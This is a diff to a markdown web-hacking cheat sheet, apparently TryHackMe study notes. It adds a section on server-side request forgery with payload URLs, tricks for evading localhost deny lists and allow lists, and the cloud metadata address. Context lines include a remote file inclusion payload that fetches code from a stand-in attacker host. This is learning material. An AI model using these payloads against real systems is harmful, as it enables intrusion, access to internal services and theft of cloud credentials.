@@ -10,7 +10,7 @@
 * [IDOR](#IDOR)
 * [HTTP 302](#HTTP-302)
 * [File Inclusion](#File-Inclusion)
-* [Cookie](#Cookie)
+* [SSRF](#SSRF)
 * [SQL Injection](#SQL-Injection)
   * [MySQL](#MySQL)
 * [XSS Injection](#XSS-Injection)
@@ -129,7 +129,30 @@
 * Remote File Inclusion (RFI): Inject an external URL into `include` function. One requirement is that `allow_url_fopen` option needs to be `on`.
   * `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
 
-## Cookie
+## SSRF
+* Server-Side Request Forgery. Allows a malicious user to cause the webserver to make an additional or edited HTTP request to the source of the attacker's choosing.
+* Blind SSRF: No information is returned to the attacker's screen. Use an external HTTP logging tool such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client to monitor requests.
+```
+       http://website.thm/stock?url=http://api.website.thm/api/usr             http://api.website.thm/api/usr
+       ---------------------------------------------------------->             ------------------------------> 
+Hacker                                                             website.thm                                 api.website.thm
+       <----------------------------------------------------------             <------------------------------
+       Website returns user data to Hacker                                     API Server returns user data to
+                                                                               the website instead of stock
+                                                                               information
+```
+* `http://website.thm/stock?url=/../user`
+* When subdomain can be controlled: `http://website.thm/stock?server=api.website.thm/api/usr&x=&id=123` will request `http://api.website.thm/api/usr?x=.website.thm/api/stock/item?id=123` where `&x=` is used to stop the remaining path from being appended to the end of the attacker's URL.
+* Finding an SSRF
+  * A full URL is used in a parameter in the address bar
+  * A hidden field in a form
+  * A partial URL such as just the hostname
+  * Path of the URL
+* Bypass SSRF defenses
+  * Deny List: If localhost and 127.0.0.1 is denied, use 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
+    * In cloud environment, 169.254.169.254 contains metadata for the deployed cloud server.
+  * Allow List: An URL used in a parameter must begin with https://website.thm. Create a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm.
+  * Open Redirect
 
 ## SQL Injection
 ### MySQL
